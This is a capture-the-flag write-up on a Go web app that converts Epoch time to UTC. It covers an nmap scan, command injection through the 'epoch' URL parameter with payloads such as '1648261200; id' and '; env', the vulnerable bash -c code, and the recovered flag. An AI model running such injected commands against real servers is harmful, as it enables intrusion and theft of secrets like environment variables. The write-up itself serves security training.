# CTF Writeup: Epoch to UTC Convertor

## Challenge Overview
The target was a web application that converts Epoch time to a human-readable UTC format. The application was found to be vulnerable to Command Injection, allowing for arbitrary code execution on the server.

## 1. Initial Enumeration

### Port Scanning
An initial Nmap scan revealed two open ports:
- **Port 22/tcp**: OpenSSH 8.2p1 (Ubuntu)
- **Port 80/tcp**: HTTP (Go Fiber web framework)

```bash
nmap -sC -sV 10.48.167.124
```

### Web Application Analysis
The web application hosted on port 80 featured a simple input field for an Epoch timestamp. Submitting a value like `1648261200` resulted in the UTC time being displayed: `Sat Mar 26 02:20:00 UTC 2022`.

The URL structure used a query parameter: `http://10.48.167.124/?epoch=1648261200`.

## 2. Vulnerability Discovery

### Command Injection
Suspecting that the input might be passed directly to a system command (like `date`), I attempted a simple command injection payload by appending a semicolon followed by the `id` command.

**Payload:** `1648261200; id`
**URL:** `http://10.48.167.124/?epoch=1648261200;+id`

The server responded with:
```text
Sat Mar 26 02:20:00 UTC 2022
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
```
This confirmed the Command Injection vulnerability.

## 3. Exploitation and Source Code Analysis

### Inspecting Source Code
By listing the files in the current directory (`ls -la`), I identified a `main.go` file. Reading its content revealed exactly how the command was being constructed:

```go
cmdString := fmt.Sprintf("date -d @%s", r.Epoch)
cmd := exec.Command("bash", "-c", cmdString)
```
The application was using `fmt.Sprintf` to concatenate the user input directly into a bash command string, which is a classic security anti-pattern.

### Finding the Flag
After searching the file system and not finding any obvious `flag.txt` files in common locations, I checked the environment variables using the `env` command.

**Payload:** `1648261200; env`
**URL:** `http://10.48.167.124/?epoch=1648261200;+env`

The output revealed the flag stored as an environment variable:
```text
HOSTNAME=e7c1352e71ec
PWD=/home/challenge
HOME=/home/challenge
GOLANG_VERSION=1.15.7
FLAG=flag{7da6c7debd40bd611560c13d8149b647}
...
```

## 4. Conclusion
The challenge was a straightforward example of Command Injection in a web application. By failing to sanitize user input before passing it to a shell, the application allowed full control over the process environment and execution.

**Flag:** `flag{7da6c7debd40bd611560c13d8149b647}`
